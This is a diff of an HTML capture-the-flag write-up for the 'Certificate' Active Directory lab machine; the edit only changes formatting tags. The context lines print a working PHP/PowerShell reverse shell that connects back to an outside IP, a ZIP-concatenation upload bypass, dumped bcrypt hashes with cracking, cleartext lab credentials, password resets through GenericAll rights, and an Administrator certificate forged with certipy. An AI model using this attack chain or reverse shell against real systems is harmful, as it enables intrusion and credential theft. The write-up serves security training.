@@ -84,7 +84,7 @@
     <a href="/writeups/" class="back-link">Back to all writeups</a>
     <div class="writeup-body">
       <h2 class="writeup-section-title">Machine Overview</h2>
-      <p>Certificate is a Hard difficulty Windows Active Directory machine featuring a web-based learning platform with a file upload vulnerability. Through a <strong>ZIP slip technique</strong>, a PHP reverse shell is uploaded to gain initial access. Credentials are extracted from a MySQL database and cracked, enabling WinRM access. BloodHound reveals <strong>GenericAll</strong> rights over domain users, which are abused to change passwords and pivot through multiple accounts. The final escalation uses <strong>SeManageVolumePrivilege</strong> and <strong>certipy-ad</strong> to forge a certificate as Administrator and obtain the domain hash.</p>
+      <p>Certificate is a Hard difficulty Windows Active Directory machine featuring a web-based learning platform with a file upload vulnerability. Through a <code>ZIP slip technique</code>, a PHP reverse shell is uploaded to gain initial access. Credentials are extracted from a MySQL database and cracked, enabling WinRM access. BloodHound reveals <code>GenericAll</code> rights over domain users, which are abused to change passwords and pivot through multiple accounts. The final escalation uses <code>SeManageVolumePrivilege</code> and <code>certipy-ad</code> to forge a certificate as Administrator and obtain the domain hash.</p>
       <h2 class="writeup-section-title">Initial Enumeration</h2>
       <h3 class="writeup-sub-title">Port Scanning</h3>
       <p>I start with a full port scan to discover all open services.</p>
@@ -219,14 +219,14 @@ Nmap done: 1 IP address (1 host up) scanned in 86.85 seconds
 &lt;?php
 shell_exec(&quot;powershell -nop -w hidden -c \&quot;\$client = New-Object System.Net.Sockets.TCPClient(&#x27;10.10.14.189&#x27;,4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2&gt;&amp;1 | Out-String ); \$sendback2 = \$sendback + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\&quot;&quot;);
 ?&gt;</code></pre></div>
-      <p>Direct upload of a malicious ZIP is rejected by the server. The trick is to create a legitimate ZIP containing a real PDF, then <strong>concatenate</strong> it with a malicious ZIP containing the PHP shell — a technique where the parser extracts the latter's contents while the outer ZIP passes validation.</p>
+      <p>Direct upload of a malicious ZIP is rejected by the server. The trick is to create a legitimate ZIP containing a real PDF, then <code>concatenate</code> it with a malicious ZIP containing the PHP shell — a technique where the parser extracts the latter's contents while the outer ZIP passes validation.</p>
       <div class="code-block"><pre><code>zip legit.zip Untitled.pdf</code></pre></div>
       <p>I inspect the file contents for sensitive data such as hardcoded credentials, configuration parameters, internal hostnames, or references to other services that could expand the attack surface.</p>
       <div class="code-block"><pre><code>cat legit.zip malicious.zip &gt; combined.zip</code></pre></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250607160653.png" alt="Combined ZIP uploaded successfully" loading="lazy" /><span class="img-caption">Combined ZIP uploaded successfully</span></div>
       <p>After uploading, the extracted PHP shell is accessible at a predictable URL path. I start a netcat listener and trigger the shell.</p>
       <div class="code-block"><pre><code>nc -lvnp 9001</code></pre></div>
-      <p>I start a <strong>netcat</strong> listener on the specified port to catch the incoming reverse shell. Netcat (<code>nc -lvnp</code>) binds to all interfaces (<code>-l</code>), enables verbose output (<code>-v</code>), skips DNS resolution (<code>-n</code>), and listens on the specified port (<code>-p</code>). Once the exploit triggers, the target machine connects back to this listener, providing an interactive command shell.</p>
+      <p>I start a <code>netcat</code> listener on the specified port to catch the incoming reverse shell. Netcat (<code>nc -lvnp</code>) binds to all interfaces (<code>-l</code>), enables verbose output (<code>-v</code>), skips DNS resolution (<code>-n</code>), and listens on the specified port (<code>-p</code>). Once the exploit triggers, the target machine connects back to this listener, providing an interactive command shell.</p>
       <div class="code-block"><pre><code>nc -lvnp 9001
 listening on [any] 9001 ...
 connect to [10.10.14.137] from (UNKNOWN) [10.129.246.127] 60925
@@ -283,7 +283,7 @@ id  first_name last_name  username      email   password        created_at      
 9   Steven     Roman    stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
 10  Sara       Brawn    sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
 12  test       test test  test@certificate.htb  $2y$04$Htvhg6O907RjbVLs3mi8/eRN1kQDwTqqnQr2Pswr9ArSIIGTOUv7O    2025-06-07 09:06:36     student 1</code></pre></div>
-      <p>I crack the bcrypt password hashes using <strong>John the Ripper</strong> with the <code>--format=bcrypt</code> flag. Bcrypt is a deliberately slow hashing algorithm designed to resist brute-force attacks — each hash attempt takes significantly longer than MD5 or SHA-based hashes, making large wordlists time-consuming. However, weak passwords from <code>rockyou.txt</code> are still crackable within a reasonable timeframe.</p>
+      <p>I crack the bcrypt password hashes using <code>John the Ripper</code> with the <code>--format=bcrypt</code> flag. Bcrypt is a deliberately slow hashing algorithm designed to resist brute-force attacks — each hash attempt takes significantly longer than MD5 or SHA-based hashes, making large wordlists time-consuming. However, weak passwords from <code>rockyou.txt</code> are still crackable within a reasonable timeframe.</p>
       <div class="code-block"><pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hashes.txt       
 Using default input encoding: UTF-8
 Loaded 7 password hashes with 7 different salts (bcrypt [Blowfish 32/64 X3])
@@ -302,7 +302,7 @@ Session aborted</code></pre></div>
 *Evil-WinRM* PS C:\Users\Sara.B\Documents&gt;</code></pre></div>
       <h2 class="writeup-section-title">User Flag: AD Privilege Abuse</h2>
       <h3 class="writeup-sub-title">BloodHound Analysis</h3>
-      <p>I retrieve LDAP data and upload it to BloodHound. The analysis reveals that <code>sara.b</code> is a member of the <strong>Account Operators</strong> group — granting <strong>GenericAll</strong> rights over several domain users.</p>
+      <p>I retrieve LDAP data and upload it to BloodHound. The analysis reveals that <code>sara.b</code> is a member of the <code>Account Operators</code> group — granting <code>GenericAll</code> rights over several domain users.</p>
       <div class="code-block"><pre><code>nxc ldap 10.129.246.127 -u &#x27;sara.b&#x27; -p &#x27;Blink182&#x27; --bloodhound --collection All --dns-server 10.129.246.127
 SMB         10.129.246.127  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
 LDAP        10.129.246.127  389    DC01             [+] certificate.htb\sara.b:Blink182 
@@ -312,12 +312,12 @@ LDAP        10.129.246.127  389    DC01             Compressing output into /hom
       <h3 class="writeup-sub-title">Password Change: Lion.SK</h3>
       <p>With GenericAll rights, I change the password of user <code>Lion.SK</code> using PowerShell and log in as that user.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users&gt; Set-ADAccountPassword -Identity &quot;Lion.SK&quot; -NewPassword (ConvertTo-SecureString &quot;Test123&quot; -AsPlainText -Force) -Reset</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>evil-winrm -i certificate.htb -u Lion.SK -p &quot;Test123&quot; 
 
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Lion.SK\Documents&gt;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Lion.SK\Desktop&gt; ls
 
 
@@ -334,21 +334,21 @@ Mode                LastWriteTime         Length Name
       <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">3bdd59bd6a6610d90b057d27a2418697</code></div>
       <h2 class="writeup-section-title">Privilege Escalation: Certificate Forgery</h2>
       <h3 class="writeup-sub-title">Pivoting to Ryan.K</h3>
-      <p>Using the same GenericAll rights, I change <code>Ryan.K</code>'s password and log in. Ryan.K is a member of the <strong>Domain Storage Managers</strong> group, which provides <strong>SeManageVolumePrivilege</strong> — the ability to manage volumes on the system.</p>
+      <p>Using the same GenericAll rights, I change <code>Ryan.K</code>'s password and log in. Ryan.K is a member of the <code>Domain Storage Managers</code> group, which provides <code>SeManageVolumePrivilege</code> — the ability to manage volumes on the system.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users&gt; Set-ADAccountPassword -Identity &quot;ryan.k&quot; -NewPassword (ConvertTo-SecureString &quot;Test123&quot; -AsPlainText -Force) -Reset</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>evil-winrm -i certificate.htb -u Ryan.k -p &quot;Test123&quot;
                          
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Ryan.K\Documents&gt;</code></pre></div>
       <div class="screenshot-wrap"><img src="assets/Pasted image 20250607161800.png" alt="Ryan.K&#x27;s group membership showing SeManageVolumePrivilege" loading="lazy" /><span class="img-caption">Ryan.K&#x27;s group membership showing SeManageVolumePrivilege</span></div>
       <h3 class="writeup-sub-title">Volume Exploit & Certificate Export</h3>
-      <p>Using <strong>SeManageVolumeExploit.exe</strong>, I exploit the volume management privilege for local privilege escalation.</p>
+      <p>Using <code>SeManageVolumeExploit.exe</code>, I exploit the volume management privilege for local privilege escalation.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Ryan.K\Documents&gt; ./SeManageVolumeExploit.exe
 Entries changed: 846
 
 DONE</code></pre></div>
-      <p>I then use <code>certutil</code> to enumerate and export a usable certificate. Certificate 2 is marked as <strong>exportable</strong>.</p>
+      <p>I then use <code>certutil</code> to enumerate and export a usable certificate. Certificate 2 is marked as <code>exportable</code>.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Ryan.K\Documents&gt; certutil -store My
 My &quot;Personal&quot;
 ================ Certificate 0 ================
@@ -424,7 +424,7 @@ Enter new password:
 Confirm new password:
 CertUtil: -exportPFX command completed successfully.</code></pre></div>
       <h3 class="writeup-sub-title">Forging an Administrator Certificate</h3>
-      <p>With the exported PFX file, I use <strong>certipy-ad</strong> to forge a certificate with the Administrator's UPN, then authenticate to extract the Administrator's NT hash.</p>
+      <p>With the exported PFX file, I use <code>certipy-ad</code> to forge a certificate with the Administrator's UPN, then authenticate to extract the Administrator's NT hash.</p>
       <div class="code-block"><pre><code>certipy-ad forge -ca-pfx certificate.pfx -upn Administrator@certificate.htb -subject &#x27;CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB&#x27;
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
@@ -451,7 +451,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
                                    
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre></div>
-      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
+      <p>I use <code>Evil-WinRM</code> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; ls
 
 
